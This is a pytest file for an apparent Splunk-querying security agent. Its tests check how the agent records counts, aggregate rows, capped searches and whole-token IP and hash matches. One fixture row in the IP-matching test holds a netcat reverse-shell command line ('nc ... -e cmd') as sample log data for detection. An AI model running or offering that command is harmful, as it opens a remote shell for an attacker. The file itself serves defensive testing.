"""A count is a count, not a row (handover 2026-10-26 h): code records what Splunk
returned -- events, a scalar count, aggregate rows, a cap -- and judges nothing it
cannot read. One test per clash in the audit table."""

from types import SimpleNamespace

from contracts import CompletionRule, FetchStep, SiemFindings, SubtaskResult, SubtaskStatus

from smartops import subagents
from smartops.broker import _digest, evaluate_step, measure_step
from smartops.guards import TstatsDeadEndGuard
from smartops.projection import project_siem, row_matches, scalar_count

COUNT = '| tstats summariesonly=f count from datamodel=Endpoint.Processes where Processes.process_name="a.exe"'
BY_IMAGE = "search index=main sourcetype=XmlWinEventLog EventCode=1 | stats count by Image"
EVENTS = "search index=main sourcetype=XmlWinEventLog EventCode=1 | table Image, CommandLine"


def _call(query, rows, **cap):
    return subagents._ToolCall(tool="splunk_run_query", query=query,
                               payload={"structuredContent": {"results": rows, **cap}})


def _project(*calls):
    return project_siem(list(calls), [], task_id="t")


def _result(findings):
    return SubtaskResult(task_id="t1:siem:tu-1", status=SubtaskStatus.OK, findings=findings,
                         queries_run=[{"query": "q"}])


def _step(**rule):
    return FetchStep(step_id="s", family="siem", objective="o", completion=CompletionRule(**rule))


def _line(rule, *calls):
    mission = SimpleNamespace(completion=rule, task_id="t")
    so_far = {}
    return [subagents._search_line(mission, list(calls[:n]), so_far) for n in range(1, len(calls) + 1)]


def test_kinds_are_read_from_the_spl():
    findings = _project(_call(COUNT, [{"count": "0"}]), _call(BY_IMAGE, [{"Image": "a", "count": 9}] * 3),
                        _call(EVENTS, [{"Image": "a.exe"}]))
    assert [rs.kind for rs in findings.processes] == ["count", "aggregate", "events"]


def test_items_1_and_7_a_zero_count_is_not_a_row():
    findings = _project(_call(COUNT, [{"count": "0"}]))
    assert findings.total_rows() == 0  # so NO_DATA is not flipped to OK
    assert measure_step(CompletionRule(categories=["processes"]), findings) == {"processes": (0, 0, False, 0)}
    assert "processes:0" in _digest(_result(findings))
    line = _line(CompletionRule(categories=["processes"]), _call(COUNT, [{"count": "0"}]))[0]
    assert "a count (count=0), not event rows" in line and "1 rows" not in line
    claim = SimpleNamespace(answers_question="absence", search=1, rows=[])
    assert subagents._claim_problem(claim, [_call(COUNT, [{"count": "0"}])], CompletionRule()) is None


def test_item_2_the_guard_reads_a_zero_count_as_empty():
    guard = TstatsDeadEndGuard("siem")
    assert guard._result_is_empty({"structuredContent": {"results": [{"count": "0"}]}})
    assert not guard._result_is_empty({"results": [{"count": "4"}]})
    assert scalar_count([{"count": "0"}]) == 0
    assert scalar_count([{"count": "0.5"}]) is None and scalar_count([{"count": 0, "host": "h"}]) is None


def test_item_3_aggregate_rows_answer_but_do_not_fill_min_rows():
    rows = [{"Image": "a.exe", "count": 500}, {"Image": "b.exe", "count": 3}]
    findings = _project(_call(BY_IMAGE, rows))
    floor = evaluate_step(_step(categories=["processes"], min_rows=2), _result(findings))
    assert (floor.rows_retrieved, floor.event_rows, floor.facts_met) == (2, 0, False)
    target = evaluate_step(_step(categories=["processes"], match=["a.exe"]), _result(findings))
    assert target.facts_met is True


def test_item_4_a_capped_search_says_so():
    call = _call(EVENTS, [{"Image": "a.exe", "n": n} for n in range(5)], truncated=True, total_rows=50)
    rs = _project(call).processes[0]
    assert (rs.truncated, rs.total) == (True, 50)
    assert "capped: Splunk had 50 rows, 5 came back" in _line(CompletionRule(), call)[0]
    assert "capped=1 search(es)" in _digest(_result(_project(call)))
    # A capped search has rows, so it is never an empty search nor an absence.
    claim = SimpleNamespace(answers_question="absence", search=1, rows=[])
    assert subagents._claim_problem(claim, [call], CompletionRule()) is not None


def test_item_5_ips_and_hashes_match_whole_tokens():
    assert not row_matches({"dest": "10.0.0.15"}, ["10.0.0.1"])
    assert row_matches({"dest": "10.0.0.1"}, ["10.0.0.1"])
    assert row_matches({"CommandLine": "nc 10.0.0.1:443 -e cmd"}, ["10.0.0.1"])
    h = "d41d8cd98f00b204e9800998ecf8427e"
    assert row_matches({"Hashes": f"MD5={h.upper()},SHA1=x"}, [h])
    assert not row_matches({"Hashes": f"MD5={h}ff"}, [h])
    assert row_matches({"file": "svcupdate.dat.bak"}, ["svcupdate.dat"])  # names stay substring
    assert subagents._matching_rows([{"d": "10.0.0.15"}, {"d": "10.0.0.1"}], ["10.0.0.1"]) == [2]


def test_item_8_a_repeated_search_counts_once():
    call = _call(EVENTS, [{"Image": "a.exe", "_time": "t1"}, {"Image": "b.exe", "_time": "t2"}])
    step = _step(min_rows=3)
    first = evaluate_step(step, _result(_project(call)))
    assert first.facts_met is False
    again = evaluate_step(step, _result(_project(call, call)), prior=first)
    # Two rows, not four; the row gate of 3 is exhausted after the second dispatch.
    assert (again.event_rows, again.facts_met) == (2, True)


def test_item_6_the_field_hint_ignores_aggregate_rows():
    earlier = [_call("search index=main sourcetype=XmlWinEventLog | stats count by Image", [{"Image": "a", "count": 1}])]
    query = 'search index=main sourcetype=XmlWinEventLog CommandLine="*x*"'
    assert subagents._unseen_filter_fields(query, earlier) == []
    earlier = [_call("search index=main sourcetype=XmlWinEventLog | table Image", [{"Image": "a"}])]
    assert subagents._unseen_filter_fields(query, earlier) == ["CommandLine"]
